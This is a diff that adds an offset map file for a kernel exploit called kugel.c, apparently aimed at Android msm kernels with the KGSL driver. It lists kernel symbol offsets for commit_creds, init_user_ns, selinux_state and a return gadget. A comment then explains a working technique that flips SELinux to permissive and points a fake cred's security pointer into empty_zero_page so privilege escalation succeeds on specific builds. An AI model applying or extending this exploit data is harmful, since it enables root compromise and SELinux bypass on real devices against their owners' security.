@@ -1,0 +1,35 @@
+# kugel.map — offset definitions for kugel.c
+# Format MACRO symbol[+offset]
+# Prefix  = optional (missing is a note, not a TODO)
+
+OFF_COMMIT_CREDS     commit_creds
+OFF_ROOT_USER        root_user
+OFF_INIT_USER_NS     init_user_ns
+OFF_INIT_GROUPS      init_groups
+OFF_SELINUX_STATE    selinux_state
+OFF_SECBLOB          modedb+0x430
+OFF_RET              kgsl_drawobj_destroy_object+0x54   # epilogue ret; re-verify on rebuild
+
+# --------------------------------------------------------------------------
+# Q3 / 3S (5.10 msm): modedb does not exist (CONFIG_FB off, all DRM), so the
+# row above cannot resolve on those trees. Use the zero-tsec trick instead:
+#
+#   empty_zero_page is a real kallsyms symbol on every build (KALLSYMS_ALL=y
+#   confirmed on 51312300157900520 and 52641960028000520), and +0x10 lands
+#   inside the zero page. Stage-2 of the exploit flips selinux_state.enforcing
+#   to 0 *before* the fake cred is ever dereferenced, so a cred->security that
+#   points into the zero page reads as an all-zero task_security_struct
+#   (osid=0, sid=0), and permissive-mode SELinux allows sid 0 checks. Result:
+#   the fake cred is usable without a real tsec.
+#
+# Matches tunaconfig.json ionstack_reference for build 52641960028000520:
+#     empty_zero_page  = 0x028fd000
+#     secblob          = 0x028fd010    (= empty_zero_page + 0x10)
+#
+# The `?` prefix marks it optional: builds that lack empty_zero_page (or
+# where +0x10 happens to be non-zero) simply get OFF_SECBLOB = null, which
+# disables --payload cred on that build but leaves --payload pte / probe
+# fully functional. derive_target_q3.py tries OFF_SECBLOB first, then this
+# row, then falls back to null.
+# --------------------------------------------------------------------------
+?OFF_SECBLOB_Q3     empty_zero_page+0x10
